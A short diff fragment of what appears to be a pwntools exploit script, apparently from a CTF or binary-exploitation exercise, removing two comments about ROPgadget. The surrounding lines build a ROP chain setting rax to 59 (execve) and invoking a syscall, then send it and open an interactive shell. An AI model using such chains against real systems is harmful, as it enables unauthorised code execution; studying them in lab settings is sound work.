@@ -25,8 +25,6 @@ p += p64(0x0000000000415294) # pop rax ; ret
 p += p64(59)                 # syscall
 p += p64(0x000000000047b20f) # complete syscall
 
-# why is ROPgadget using asm(add rax, 1 ; ret)?
-# very BAD
 
 r.sendline(p)
 r.interactive()
